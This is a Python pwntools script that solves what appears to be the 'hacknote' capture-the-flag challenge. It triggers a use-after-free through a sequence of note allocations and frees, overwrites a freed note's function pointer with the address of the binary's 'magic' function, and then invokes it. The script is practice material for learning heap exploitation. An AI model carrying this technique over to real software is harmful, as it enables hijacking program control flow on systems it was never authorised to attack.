#! /usr/bin/env   python2
from pwn import *
context.terminal = ['konsole', '-x', 'sh', '-c']

elf = ELF('./hacknote')
sh = process('./hacknote')
gdb.attach(sh)
context.log_level = 'debug'
magic = elf.symbols['magic']
log.info("magic -> " + hex(magic))

def add_note(size, content):
    sh.recvuntil('choice :')
    sh.sendline('1')
    sh.recvuntil('size :')
    sh.sendline(str(size))
    sh.recvuntil('Content :')
    sh.sendline(str(content))

def del_note(index):
    sh.recvuntil("choice :")
    sh.sendline('2')
    sh.sendline(str(index))

def print_note(index):
    sh.recvuntil('choice :')
    sh.sendline('3')
    sh.recvuntil('Index :')
    sh.sendline(str(index))

def exploit():
    add_note(16, p32(magic))
    add_note(16, 'a'*16)
    del_note(0)
    del_note(1)
    add_note(8, p32(magic))
    print_note(0)
    sh.recvuntil('choice :')
    sh.sendline('4')

exploit()
sh.interactive()
